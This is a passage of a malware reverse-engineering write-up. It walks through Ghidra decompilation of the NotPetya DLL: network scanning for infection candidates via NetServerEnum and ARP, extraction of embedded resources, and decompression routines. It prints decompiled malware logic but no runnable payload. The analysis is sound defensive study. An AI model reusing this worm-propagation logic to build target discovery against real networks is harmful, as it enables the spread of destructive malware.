        puVar3 = puVar3 + 6;
        uVar2 = uVar2 + 1;
      } while (uVar2 < local_c);
    }
  }
  else {
    param_3 = (LMCSTR)0x0;
  }
  if (local_8 != (LPBYTE)0x0) {
    NetApiBufferFree(local_8);
  }
  return param_3;
}
```

Next we turn to the `NetServerEnum` call itself, this subroutine lists all the servers of a given specified type that are visible in a domain.

The level for the `NetServerEnum` call is set to `0x65` which means `101` meaning data is returned as an array of [SERVER_INFO_101](https://docs.microsoft.com/nl-nl/windows/win32/api/lmserver/ns-lmserver-server_info_101) structures. These structures are stored at `local_8`, we therefore also rename and retype `local_8`. 

We also see that `prefmaxlen` is passed as `MAX_PREFERRED_LENGTH` mean it'll determine how much memory to allocate itself.

The total number of entires read will be stored in `local_c` and the total number of visible hosts is stored in `local_14`. Given the length is passed as `MAX_PREFERRED_LENGTH` we expect these to be equal.

The server type to look for is passed as `param_2`. The value of `param_2` passed into this function we recall as `0x80000000` this value maps to `SV_TYPE_DOMAIN_ENUM` which indicates the primary domain.

Lastly `param_3` is passed as the domain to list the servers for. We know that this value was passed as `0`. Passing `NULL` here means `NetServerEnum` assumes that the primary domain is implied.

Next we see a guard on the returned value for `0` or `0xea`, `0` and `0xea` maps to `ERROR_MORE_DATA`. These two effectively represent the two cases where there is data returned. We also see that at this point `domain` is assigned a `1` and is later on returned as the return value. A return value of `1` is also returned when the returned server information equals a `NULL` pointer.

If these checks pass and the total number of entires read is not 0 then `ppWVar3` is assigned the memory address of the server name. If the address is equal to `(LMSTR *)&DAT_00000004` then the loop over the list of servers is broken.

The actual instructions behind this are.

```
                             LAB_100079a1                                    XREF[2]:     10007993(j), 1000799a(j)  
        100079a1 8b 7d fc        MOV        EDI,dword ptr [EBP + servers]
        100079a4 c7 45 10        MOV        dword ptr [EBP + domain],0x1
                 01 00 00 00
        100079ab 3b fe           CMP        EDI,ESI
        100079ad 74 5f           JZ         LAB_10007a0e
        100079af 53              PUSH       EBX
        100079b0 33 db           XOR        EBX,EBX
        100079b2 39 75 f8        CMP        dword ptr [EBP + entries_read],ESI
        100079b5 76 48           JBE        LAB_100079ff
        100079b7 83 c7 04        ADD        EDI,0x4
                             LAB_100079ba                                    XREF[1]:     100079fd(j)  
        100079ba 8d 47 fc        LEA        EAX,[EDI + -0x4]
        100079bd 85 c0           TEST       EAX,EAX
        100079bf 74 3e           JZ         LAB_100079ff
```

The main reason that this is relevant is because `DAT_00000004` isn't actually part of the program (because Ghidra starts at 10000000). However this doesn't exactly look like a data field either. The actual test that breaks the loop is `TEST EAX,EAX` and only if EAX is `0`. We also know the value of `EAX` to be `LEA EAX,[EDI + -0x4]`. And since we know `EDI` to hold `servers` this loads the address of the `sv101_platform_id` field of the `SERVER_INFO_101` structure. Effectively this could function as a `NULL` check, but the correlation with the decompilation result is questionable at best.

The next guard checks offset `ppWVar3[3]` which refers to the `sv101_type` property to `0x80000000` this effectively allows anything except for `SV_TYPE_DOMAIN_ENUM` to pass (primary domain).

Assuming that check passed a check is also executed with `ppWVar3[-1]` which refers to `sv101_platform_id` and is checked against `0x1f4` which maps to `PLATFORM_ID_NT` meaning only Windows NT platform servers are accepted.

The second guard is `(4 < ((byte)ppWVar3[1] & 0xf))`, here `ppWVar3[1]` refers to the `sv101_version_major` field. The `0xf` represents the `MAJOR_VERSION_MASK` which has to be used to extract the major version number of the member. After doing this all it is checked if the major version if greater than `4`. This only allows versions of Windows `Windows 2000` and newer to pass.

If both guards are passed then `possible_lock_and_wait_check_args` is invoked (and since this is in a loop that would happen for all servers).

Alternatively if the type checked failed and the server type is in fact `SV_TYPE_DOMAIN_ENUM` then `FUN_1000795a` is invoked with the name of the server in the current interation as the `domain` name and the `server_type` set to `3`. Note that a server type of `3` is the bitwise combination of `SV_TYPE_WORKSTATION` and `SV_TYPE_SERVER`.

So then to summarize this is a recursive function with two stages, the first stage finds `SV_TYPE_DOMAIN_ENUM` hosts and the domains these are associated with are then used to find other hosts of type `SV_TYPE_WORKSTATION` and `SV_TYPE_SERVER` recursively (second recursion level). All of these hosts then have to pass some NT version checks before they lead to `possible_lock_and_wait_check_args` being invoked. We will rename this subroutine to `find_infection_candidates_via_domain`.

### Back to FUN_10007c10

Back in `FUN_10007c10` we will rename it to `find_infection_candidates_on_network` to obtain the following result.

```cpp
void find_infection_candidates_on_network(void){
  bool bVar1;
  LPVOID lpParameter;
  BOOL BVar2;
  WCHAR net_bios_name [260];
  DWORD local_8;
  
  lpParameter = critical_section_no_extra_debug;
  possible_lock_and_wait_check_args(critical_section_no_extra_debug);
  possible_lock_and_wait_check_args(lpParameter);
  local_8 = 0x104;
  BVar2 = GetComputerNameExW(ComputerNamePhysicalNetBIOS,net_bios_name,&local_8);
  if (BVar2 != 0) {
    possible_lock_and_wait_check_args(lpParameter);
  }
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,find_infection_candidates,lpParameter,0,(LPDWORD)0x0);
  bVar1 = false;
  do {
    find_remote_infection_candidates(lpParameter);
    find_infection_candidates_arp(lpParameter);
    if (!bVar1) {
      find_infection_candidates_via_domain(lpParameter,0x80000000,0);
      bVar1 = true;
    }
    Sleep(180000);
  } while( true );
}
```

Although we do not directly see anything get infected it is highly likely that this thread is responsible for finding other targets that may be vulnerable to EternalBlue.

### Back to Ordinal_1

Back in `Ordinal_1` the next statement we see is only executed with certain privileges and when a certain anti virus is not running.

```cpp
if (((granted_privileges & 2) != 0) && ((detected_anti_virus & 1) != 0)) {
  FUN_10007545();
}
```

The privilege being checked for is the `SeDebugPrivilege`. The bit being checked in `detected_anti_virus` is the 1st one. This is odd because no information is actually stored in that location. The most likely explanation then is that this is a check to see if anti virus detection was performed at all as this bit would be 0 if the anti virus detection failed to execute.

### FUN_10007545

```cpp
void FUN_10007545(void){
  SIZE_T SVar1;
  HANDLE hHeap;
  HMODULE hModule;
  FARPROC pFVar2;
  HRSRC pHVar3;
  int iVar4;
  DWORD dwFlags;
  UINT UVar5;
  HRESULT HVar6;
  BOOL BVar7;
  char *lpProcName;
  undefined *lpMem;
  WCHAR local_1aa4 [1024];
  WCHAR local_12a4 [1024];
  WCHAR local_aa4 [520];
  WCHAR local_694 [780];
  _STARTUPINFOW local_7c;
  _PROCESS_INFORMATION local_38;
  ulong local_28;
  undefined4 local_24;
  undefined4 uStack32;
  undefined4 uStack28;
  HANDLE local_18;
  int local_14;
  LPOLESTR local_10;
  undefined *local_c;
  SIZE_T local_8;
  
  local_c = (undefined *)0x0;
  local_8 = 0;
  hHeap = GetCurrentProcess();
  lpProcName = "IsWow64Process";
  local_14 = 0;
  hModule = GetModuleHandleW(L"kernel32.dll");
  pFVar2 = GetProcAddress(hModule,lpProcName);
  if (pFVar2 != (FARPROC)0x0) {
    (*pFVar2)(hHeap,&local_14);
  }
  pHVar3 = FindResourceW(DLL_handle,(LPCWSTR)((uint)(local_14 != 0) + 1),(LPCWSTR)0xa);
  if (pHVar3 == (HRSRC)0x0) {
    iVar4 = 0;
  }
  else {
    iVar4 = FUN_100085d0(&local_8,pHVar3);
  }
  if (iVar4 != 0) {
    dwFlags = GetTempPathW(0x208,local_aa4);
    lpMem = local_c;
    SVar1 = local_8;
    if ((dwFlags != 0) &&
       (UVar5 = GetTempFileNameW(local_aa4,(LPCWSTR)0x0,0,local_694), lpMem = local_c,
       SVar1 = local_8, UVar5 != 0)) {
      local_28 = 0;
      local_24 = 0;
      uStack32 = 0;
      uStack28 = 0;
      HVar6 = CoCreateGuid((GUID *)&local_28);
      lpMem = local_c;
      SVar1 = local_8;
      if (-1 < HVar6) {
        local_10 = (LPOLESTR)0x0;
        HVar6 = StringFromCLSID((IID *)&local_28,&local_10);
        lpMem = local_c;
        SVar1 = local_8;
        if (-1 < HVar6) {
          iVar4 = FUN_100073ae(local_694,local_c);
          if (iVar4 != 0) {
            wsprintfW(local_12a4,L"\\\\.\\pipe\\%ws",local_10);
            local_18 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_100073fd,local_12a4,0,
                                    (LPDWORD)0x0);
            lpMem = local_c;
            SVar1 = local_8;
            if (local_18 != (HANDLE)0x0) {
              local_38.hProcess = (HANDLE)0x0;
              local_38.hThread = (HANDLE)0x0;
              local_38.dwProcessId = 0;
              local_38.dwThreadId = 0;
              memset(&local_7c,0,0x44);
              local_7c.wShowWindow = 0;
              local_7c.cb = 0x44;
              wsprintfW(local_1aa4,L"\"%ws\" %ws",local_694,local_12a4);
              BVar7 = CreateProcessW(local_694,local_1aa4,(LPSECURITY_ATTRIBUTES)0x0,
                                     (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCWSTR)0x0
                                     ,(LPSTARTUPINFOW)&local_7c,(LPPROCESS_INFORMATION)&local_38);
              if (BVar7 != 0) {
                WaitForSingleObject(local_38.hProcess,60000);
                FUN_100070fa();
                TerminateThread(local_18,0);
              }
              CloseHandle(local_18);
              lpMem = local_c;
              SVar1 = local_8;
            }
            while (SVar1 != 0) {
              *lpMem = 0;
              lpMem = lpMem + 1;
              SVar1 = SVar1 - 1;
            }
            FUN_100073ae(local_694,local_c);
            DeleteFileW(local_694);
          }
          CoTaskMemFree(local_10);
          lpMem = local_c;
          SVar1 = local_8;
        }
      }
    }
    while (SVar1 != 0) {
      *lpMem = 0;
      lpMem = lpMem + 1;
      SVar1 = SVar1 - 1;
    }
    dwFlags = 0;
    lpMem = local_c;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,lpMem);
  }
  return;
}
```

This function starts with getting a handle to `kernel32.dll` and the address of the `IsWow64Process` subroutine.

Consequently the [IsWow64Process](https://docs.microsoft.com/en-us/windows/win32/api/wow64apiset/nf-wow64apiset-iswow64process) subroutine is invoked and the result stored in `local_14`. This means that `local_14` will be set to true if the processes is running using the [WOW64](https://docs.microsoft.com/nl-nl/windows/win32/winprog64/running-32-bit-applications) emulator which is a part of windows that allows running 32bit applications on a 64bit system.

Next we see a call to [FindResourceW](https://docs.microsoft.com/en-us/windows/win32/shell/findresourcewrapw) to determine the location of some resource inside the DLL. The type is passed as `0xa` which maps to [RT_RCDATA](https://docs.microsoft.com/en-us/windows/win32/menurc/resource-types) meaning raw data. The name of the resource is either `1` (if not using WOW64) or `2` (if using WOW64). Presumably both refer to the same resource but one is hte 32bit version and the other the 64bit version so only the correct one for the host system is used.

In order to find these resources we use a tool called `wrestool` and run it on the malware file.

```
roan@roanXPS:~/Downloads/2IC80/Project$ wrestool 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745
--type=10 --name=1 --language=1033 [type=rcdata offset=0x200e8 size=24958]
--type=10 --name=2 --language=1033 [type=rcdata offset=0x26268 size=27426]
--type=10 --name=3 --language=1033 [type=rcdata offset=0x2cd8c size=191605]
--type=10 --name=4 --language=1033 [type=rcdata offset=0x5ba04 size=3379]
```

We can clearly see the resources we were expecting here, we also see that two more resources named `3` and `4` also exist. For now however we will extract resource `2` mostly because the malware dll was 32bit, but in reality the one we extract does not matter.

We first start by extracting `2`.

```
roan@roanXPS:~/Downloads/2IC80/Project$ wrestool --name=2 -R -x 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745 > 2.bin
```

Running `file` on the extract resource reveals that it is just data.

```
roan@roanXPS:~/Downloads/2IC80/Project$ file 2.bin 
2.bin: data
```

Using `hexedit` to inspect the file we do not really find anything special either. Just to be safe we will also look at resource `1` to make sure that this one isn't anything special.

```
roan@roanXPS:~/Downloads/2IC80/Project$ wrestool --name=1 -R -x 027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745 > 1.bin
roan@roanXPS:~/Downloads/2IC80/Project$ file 1.bin
1.bin: data
roan@roanXPS:~/Downloads/2IC80/Project$ hexedit 1.bin
```

This resource is not really any different from `2` so for now we'll return to the decompiled code as this might provide an insight into what these resources are used for.

In the Ghidra we see that if the `FindResourceW` call succeeds then `FUN_100085d0` is invoked with the resource and a `SIZE_T` pointer to most likely store a return value in.

### FUN_100085d0

```cpp
undefined4 FUN_100085d0(SIZE_T *param_1,HRSRC resource){
  HGLOBAL hResData;
  HRSRC *ppHVar1;
  DWORD dwFlags;
  HANDLE hHeap;
  LPVOID lpMem;
  int iVar2;
  LPVOID *unaff_EBX;
  DWORD dwFlags_00;
  HRSRC dwBytes;
  undefined4 local_8;
  
  local_8 = 0;
  hResData = LoadResource(DLL_handle,resource);
  if (((hResData != (HGLOBAL)0x0) &&
      (ppHVar1 = (HRSRC *)LockResource(hResData), ppHVar1 != (HRSRC *)0x0)) &&
     (dwFlags = SizeofResource(DLL_handle,resource), dwFlags != 0)) {
    dwBytes = *ppHVar1;
    dwFlags_00 = 8;
    hHeap = GetProcessHeap();
    lpMem = HeapAlloc(hHeap,dwFlags_00,(SIZE_T)dwBytes);
    *unaff_EBX = lpMem;
    if (lpMem != (LPVOID)0x0) {
      resource = *ppHVar1;
      iVar2 = FUN_1000a520(lpMem,&resource,(uint *)(ppHVar1 + 1),dwFlags - 4);
      if (iVar2 == 0) {
        if (param_1 != (SIZE_T *)0x0) {
          *(HRSRC *)param_1 = resource;
        }
        local_8 = 1;
      }
      else {
        lpMem = *unaff_EBX;
        dwFlags = 0;
        hHeap = GetProcessHeap();
        HeapFree(hHeap,dwFlags,lpMem);
      }
    }
  }
  return local_8;
}
```

This subroutine looks relatevely straight forward. The resource is first loaded and then locked. This is followed up by allocating some memory. The exact amount is equal to the double word of the resource. Looking at resource `2` this is `00 DC 00 00`.

```
00000000   00 DC 00 00  78 DA EC BD  79 7C 54 45  D6 30 7C 3B  ....x...y|TE.0|;
```

We can then compute that `00DC0000` bytes in hex is `14417920` bytes or 14080 KB or 13 MB. This appears to be quite a lot (could be less if we have a little vs big endian issue here).

After this we see a call to `FUN_1000a520` with the allocated memory, resource address pointer (`ppHVar1`, pointer to the resource in memory but offset by `1` so skipping the first double word we used to allocate memory and the size of the resource minus `4` so again skipping the double word that was used to allocate memory.

### FUN_1000a520

```cpp
int FUN_1000a520(LPVOID memory,undefined4 *resource,uint *res_pointer_offset,
                int res_size_from_pointer){
  int iVar1;
  uint *local_3c;
  int local_38;
  LPVOID local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_1c;
  undefined4 local_18;
  
  local_1c = 0;
  local_18 = 0;
  local_3c = res_pointer_offset;
  local_38 = res_size_from_pointer;
  local_30 = memory;
  local_2c = *resource;
  iVar1 = FUN_1000bb31((int)&local_3c,"1.2.8",0x38);
  if (iVar1 == 0) {
    iVar1 = FUN_1000a5cc(&local_3c,4);
    if (iVar1 == 1) {
      *resource = local_28;
      iVar1 = FUN_1000ba60((int)&local_3c);
    }
    else {
      FUN_1000ba60((int)&local_3c);
      if ((iVar1 == 2) || ((iVar1 == -5 && (local_38 == 0)))) {
        iVar1 = -3;
      }
    }
  }
  return iVar1;
}
```

The first thing we see is a call to `FU_1000bb31` with the offset resource pointer that was passed. We also see the string `1.2.8` and number `0x38` being passed.

### FUN_1000bb31

```cpp
void FUN_1000bb31(int param_1,char *param_2,int param_3){
  FUN_1000baa4(param_1,0xf,param_2,param_3);
  return;
}
```

This function doesn't really appear to do a lot other than delegating everything an other function and adding a `0xf` argument for the second parameter.

### FUN_1000baa4

```cpp
int FUN_1000baa4(int param_1,uint param_2,char *param_3,int param_4){
  int iVar1;
  int iVar2;
  
  if (((param_3 == (char *)0x0) || (*param_3 != '1')) || (param_4 != 0x38)) {
    iVar2 = -6;
  }
  else {
    if (param_1 == 0) {
      iVar2 = -2;
    }
    else {
      *(undefined4 *)(param_1 + 0x18) = 0;
      if (*(int *)(param_1 + 0x20) == 0) {
        *(undefined4 *)(param_1 + 0x20) = 0x1000c223;
        *(undefined4 *)(param_1 + 0x28) = 0;
      }
      if (*(int *)(param_1 + 0x24) == 0) {
        *(undefined4 *)(param_1 + 0x24) = 0x1000c236;
      }
      iVar1 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x1bcc);
      if (iVar1 == 0) {
        iVar2 = -4;
      }
      else {
        *(int *)(param_1 + 0x1c) = iVar1;
        *(undefined4 *)(iVar1 + 0x34) = 0;
        iVar2 = FUN_1000bb48(param_1,param_2);
        if (iVar2 != 0) {
          (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),iVar1);
          *(undefined4 *)(param_1 + 0x1c) = 0;
        }
      }
    }
  }
  return iVar2;
}
```

Unfortunately this function appears to be referencing functions from the resource that was loaded earlier. However because Ghidra does of course not know about these functions everything appears as pointers and offsets.

So next we will try to open resource `2` in Ghidra, for this we will have to guess the architecture and type of the binary. Given that we don't really have anything to go off we'll try guess the same as the NotPetya binary itself `x86:LE:32:default:windows`.

Unfortunately this guess failed for both extracted binaries. This also means we will probably have a hard time analyzing this specific subroutine. We do not think that it is worth the time and effort to figure out how to decompile the resources at this point in time.

As for the function the first thing we see is a check on the passed arguments, this ensure that they are actually what we passed in and not `NULL`. Why `param_4` was passed at all and not just declared in this subroutine is unclear though.

As for the main functionality of the code we see that all offsets are fairly low so we'll try to gather as much information as possible by inspecting resource `2` using a hex editor.

```
00000000   00 DC 00 00  78 DA EC BD  79 7C 54 45  D6 30 7C 3B  ....x...y|TE.0|;
00000010   DD 9D 74 42  9A DB 2C 0D  11 88 B4 18  34 12 96 60  ..tB..,.....4..`
00000020   54 12 9B 68  5F E8 86 DB  70 1B A3 AC  8E A0 40 20  T..h_...p.....@
00000030   C4 91 25 26  B7 59 04 94  D8 89 D2 94  AD 38 AE A3  ..%&.Y.......8..
00000040   8E E3 AC 32  AB 3A 33 8F  04 70 C9 02  24 61 0D A8  ...2.:3..p..$a..
00000050   18 88 4A DC  86 1B 1B 25  22 42 58 F4  7E E7 9C BA  ..J....%"BX.~...
```

The function starts with a few assignments. The first function call is.

```cpp
iVar1 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x1bcc);
```

What this subroutine does is of course unknown, but it looks like a status check. If the check passed we end up in the else branch where we see more assignments and a call to `FUN_1000bb48`.

### FUN_1000bb48

```cpp
undefined4 FUN_1000bb48(int param_1,uint param_2){
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  
  iVar2 = param_1;
  if ((param_1 != 0) && (iVar1 = *(int *)(param_1 + 0x1c), iVar1 != 0)) {
    if ((int)param_2 < 0) {
      param_1 = 0;
      param_2 = -param_2;
    }
    else {
      param_1 = ((int)param_2 >> 4) + 1;
      if ((int)param_2 < 0x30) {
        param_2 = param_2 & 0xf;
      }
    }
    if ((param_2 == 0) || ((7 < (int)param_2 && ((int)param_2 < 0x10)))) {
      if ((*(int *)(iVar1 + 0x34) != 0) && (*(uint *)(iVar1 + 0x24) != param_2)) {
        (**(code **)(iVar2 + 0x24))(*(undefined4 *)(iVar2 + 0x28),*(undefined4 *)(iVar1 + 0x34));
        *(undefined4 *)(iVar1 + 0x34) = 0;
      }
      *(int *)(iVar1 + 8) = param_1;
      *(uint *)(iVar1 + 0x24) = param_2;
      uVar3 = FUN_1000bbbf(iVar2);
      return uVar3;
    }
  }
  return 0xfffffffe;
}
```

Unfortuantely this function isn't much better. We again see a few input status checks but we don't neccesarily know what they are checking. So far all the assignments are internal to the binary however. So no external fields are assigned a value at all so far. Most likely this binary is made to do something and not to computer and return something. At the end we see a call to `FUN_1000bbbf` with only the the original `param_1` passed.

### FUN_1000bbbf

```cpp
undefined4 FUN_1000bbbf(int param_1){
  int iVar1;
  undefined4 uVar2;
  
  if ((param_1 == 0) || (iVar1 = *(int *)(param_1 + 0x1c), iVar1 == 0)) {
    uVar2 = 0xfffffffe;
  }
  else {
    *(undefined4 *)(iVar1 + 0x28) = 0;
    *(undefined4 *)(iVar1 + 0x2c) = 0;
    *(undefined4 *)(iVar1 + 0x30) = 0;
    uVar2 = FUN_1000bbea(param_1);
  }
  return uVar2;
}
```

This subroutien also appears to follow the familiar format, the input is checked, some assignments are made and then a nested function is called, in this case `FUN_1000bbea`.

### FUN_1000bbea

```cpp
undefined4 FUN_1000bbea(int param_1){
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  
  if ((param_1 == 0) || (puVar2 = *(undefined4 **)(param_1 + 0x1c), puVar2 == (undefined4 *)0x0)) {
    uVar3 = 0xfffffffe;
  }
  else {
    puVar2[7] = 0;
    *(undefined4 *)(param_1 + 0x14) = 0;
    *(undefined4 *)(param_1 + 8) = 0;
    *(undefined4 *)(param_1 + 0x18) = 0;
    if (puVar2[2] != 0) {
      *(uint *)(param_1 + 0x30) = puVar2[2] & 1;
    }
    puVar2[0x6f1] = 0xffffffff;
    puVar1 = puVar2 + 0x14c;
    *puVar2 = 0;
    puVar2[1] = 0;
    puVar2[3] = 0;
    puVar2[8] = 0;
    puVar2[0xe] = 0;
    puVar2[0xf] = 0;
    *(undefined4 **)(puVar2 + 0x1b) = puVar1;
    *(undefined4 **)(puVar2 + 0x14) = puVar1;
    *(undefined4 **)(puVar2 + 0x13) = puVar1;
    uVar3 = 0;
    puVar2[5] = 0x8000;
    puVar2[0x6f0] = 1;
  }
  return uVar3;
}
```

Looks like this function is the last of this chain. Interestingly enough it contains no function calls and only has assignments.

Given that we currently do not have the means to properly analyse these functions we will have to stop here. The important take aways are that the extracted resource binary does something, returns nothing and gets a lot of data assigned. For now we'll assume that all of these function are related to the initialisation of the binary as it's mostly data being assined. The renames we'll perform are based on depth.

- `FUN_1000bb31` -> `init_res_l1`
- `FUN_1000baa4` -> `init_res_l2`
- `FUN_1000bb48` -> `init_res_l3`
- `FUN_1000bbbf` -> `init_res_l4`
- `FUN_1000bbea` -> `init_res_l5`

### Back to init_res_l4

This subroutine returns after the call to `init_res_l5`.

### Back to init_res_l3

This subroutine returns after the call to `init_res_l4`.

### Back to init_res_l2

After the call to `init_res_l3` we see another function call on the binary with the return code of the call. This is followed by another assignment.

### Back to init_res_l1

This subroutine has no other code besides the call to `init_res_l2`.

### Back to FUN_1000a520

The call chain was rather difficult to gain information from. Most likely it's initialisation. It's also note worthy that all offsets seen where to the start of the binary. Most of the binary wasn't touched at all. We can also assume that the initialisation returned a status code which we can see being used to determine whether to proceed or not.

If the initialisation was a success we then see a call to `FUN_1000a5cc` next with again the resource pointer as an argument and `4`.

### FUN_1000a5cc

```cpp
int FUN_1000a5cc(uint **param_1,int param_2){
  undefined2 uVar1;
  uint *puVar2;
  uint *puVar3;
  char cVar4;
  uint *puVar5;
  uint uVar6;
  int iVar7;
  uint *_Size;
  int iVar8;
  byte bVar9;
  uint uVar10;
  ushort uVar11;
  uint extraout_EDX;
  uint uVar12;
  uint uVar13;
  uint *local_38;
  uint *local_2c;
  int local_24;
  uint *local_20;
  uint *local_1c;
  char local_18;
  undefined local_17;
  undefined local_16;
  undefined local_15;
  uint local_14;
  uint local_10;
  uint *local_c;
  uint *local_8;
  
  if ((((param_1 != (uint **)0x0) && (puVar2 = param_1[7], puVar2 != (uint *)0x0)) &&
      (param_1[3] != (uint *)0x0)) && ((*param_1 != (uint *)0x0 || (param_1[1] == (uint *)0x0)))) {
    if (*puVar2 == 0xb) {
      *puVar2 = 0xc;
    }
    local_20 = param_1[3];
    uVar12 = puVar2[0xe];
    uVar13 = puVar2[0xf];
    local_2c = param_1[4];
    local_c = *param_1;
    puVar3 = param_1[1];
    local_24 = 0;
    uVar10 = *puVar2;
    puVar5 = puVar3;
    local_1c = local_2c;
    local_14 = uVar13;
    local_10 = uVar12;
    local_8 = puVar3;
    if (uVar10 < 0x1f) {
switchD_1000a64e_switchD:
      switch((&switchdataD_1000b9e4)[uVar10]) {
      case (undefined *)0x1000a655:
        if (puVar2[2] != 0) {
          while (uVar13 < 0x10) {
            if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
            puVar5 = (uint *)((int)puVar5 - 1);
            bVar9 = (byte)uVar13;
            uVar13 = uVar13 + 8;
            uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
            local_c = (uint *)((int)local_c + 1);
            local_14 = uVar13;
            local_10 = uVar12;
            local_8 = puVar5;
          }
          if (((*(byte *)(puVar2 + 2) & 2) != 0) && (uVar12 == 0x8b1f)) {
            uVar12 = FUN_1000bf51(0,(uint *)0x0,0);
            puVar2[6] = uVar12;
            local_18 = '\x1f';
            local_17 = 0x8b;
            uVar12 = FUN_1000bf51(puVar2[6],(uint *)&local_18,2);
            puVar2[6] = uVar12;
            local_10 = 0;
            local_14 = 0;
            *puVar2 = 1;
            puVar5 = local_8;
            uVar12 = 0;
            uVar13 = 0;
            goto LAB_1000ac55;
          }
          puVar2[4] = 0;
          if (puVar2[8] != 0) {
            *(undefined4 *)(puVar2[8] + 0x30) = 0xffffffff;
          }
          uVar10 = uVar12;
          if (((*(byte *)(puVar2 + 2) & 1) == 0) ||
             (uVar10 = local_10, ((uVar12 >> 8) + (uVar12 & 0xff) * 0x100) % 0x1f != 0)) {
            *(char **)(param_1 + 6) = "incorrect header check";
          }
          else {
            if (((byte)local_10 & 0xf) == 8) {
              uVar10 = local_10 >> 4;
              uVar13 = uVar13 - 4;
              uVar12 = (uVar10 & 0xf) + 8;
              local_14 = uVar13;
              local_10 = uVar10;
              if (puVar2[9] == 0) {
                puVar2[9] = uVar12;
              }
              else {
                if (puVar2[9] <= uVar12 && uVar12 != puVar2[9]) {
                  *(char **)(param_1 + 6) = "invalid window size";
                  goto LAB_1000a729;
                }
              }
              uVar13 = 0;
              puVar2[5] = 1 << (sbyte)uVar12;
              puVar5 = (uint *)FUN_1000bd21(0,(byte *)0x0,0);
              *(uint **)(puVar2 + 6) = puVar5;
              param_1[0xc] = puVar5;
              *puVar2 = ~(local_10 >> 8) & 2 | 9;
              uVar12 = 0;
              puVar5 = local_8;
              local_14 = uVar13;
              local_10 = uVar12;
              goto LAB_1000ac55;
            }
            *(char **)(param_1 + 6) = "unknown compression method";
          }
          goto LAB_1000a729;
        }
        *puVar2 = 0xc;
        goto LAB_1000ac55;
      case (undefined *)0x1000a79d:
        while (uVar13 < 0x10) {
          if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
          puVar5 = (uint *)((int)puVar5 - 1);
          bVar9 = (byte)uVar13;
          uVar13 = uVar13 + 8;
          uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
          local_c = (uint *)((int)local_c + 1);
          local_14 = uVar13;
          local_10 = uVar12;
          local_8 = puVar5;
        }
        puVar2[4] = uVar12;
        if ((char)uVar12 == '\b') {
          if ((uVar12 & 0xe000) == 0) {
            if ((uint *)puVar2[8] != (uint *)0x0) {
              *(uint *)puVar2[8] = uVar12 >> 8 & 1;
            }
            if ((puVar2[4] & 0x200) != 0) {
              local_17 = (undefined)(uVar12 >> 8);
              local_18 = (char)uVar12;
              uVar12 = FUN_1000bf51(puVar2[6],(uint *)&local_18,2);
              puVar2[6] = uVar12;
            }
            uVar12 = 0;
            *puVar2 = 2;
            local_10 = 0;
            uVar13 = 0;
            puVar5 = local_8;
            goto joined_r0x1000a848;
          }
          *(char **)(param_1 + 6) = "unknown header flags set";
        }
        else {
          *(char **)(param_1 + 6) = "unknown compression method";
        }
        goto LAB_1000a7e3;
      case (undefined *)0x1000a845:
joined_r0x1000a848:
        while (uVar13 < 0x20) {
          if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
          local_8 = (uint *)((int)puVar5 - 1);
          bVar9 = (byte)uVar13;
          uVar13 = uVar13 + 8;
          uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
          local_c = (uint *)((int)local_c + 1);
          puVar5 = local_8;
          local_10 = uVar12;
        }
        if (puVar2[8] != 0) {
          *(uint *)(puVar2[8] + 4) = uVar12;
        }
        if ((puVar2[4] & 0x200) != 0) {
          local_18 = (char)uVar12;
          local_17 = (undefined)(uVar12 >> 8);
          local_16 = (undefined)(uVar12 >> 0x10);
          local_15 = (undefined)(uVar12 >> 0x18);
          uVar12 = FUN_1000bf51(puVar2[6],(uint *)&local_18,4);
          puVar2[6] = uVar12;
        }
        uVar12 = 0;
        *puVar2 = 3;
        local_10 = 0;
        uVar13 = 0;
        puVar5 = local_8;
      case (undefined *)0x1000a8c6:
        while (uVar13 < 0x10) {
          if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
          local_8 = (uint *)((int)puVar5 - 1);
          bVar9 = (byte)uVar13;
          uVar13 = uVar13 + 8;
          uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
          local_c = (uint *)((int)local_c + 1);
          puVar5 = local_8;
          local_10 = uVar12;
        }
        if (puVar2[8] != 0) {
          *(uint *)(puVar2[8] + 8) = uVar12 & 0xff;
          *(uint *)(puVar2[8] + 0xc) = uVar12 >> 8;
        }
        if ((puVar2[4] & 0x200) != 0) {
          local_18 = (char)uVar12;
          local_17 = (undefined)(uVar12 >> 8);
          uVar12 = FUN_1000bf51(puVar2[6],(uint *)&local_18,2);
          puVar2[6] = uVar12;
        }
        uVar12 = 0;
        *puVar2 = 4;
        uVar13 = 0;
        local_10 = 0;
        local_14 = 0;
        puVar5 = local_8;
switchD_1000a64e_caseD_1000a94a:
        if ((puVar2[4] & 0x400) == 0) {
          if (puVar2[8] != 0) {
            *(undefined4 *)(puVar2[8] + 0x10) = 0;
          }
        }
        else {
          while (uVar13 < 0x10) {
            if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
            puVar5 = (uint *)((int)puVar5 - 1);
            bVar9 = (byte)uVar13;
            uVar13 = uVar13 + 8;
            uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
            local_c = (uint *)((int)local_c + 1);
            local_10 = uVar12;
            local_8 = puVar5;
          }
          puVar2[0x10] = uVar12;
          if (puVar2[8] != 0) {
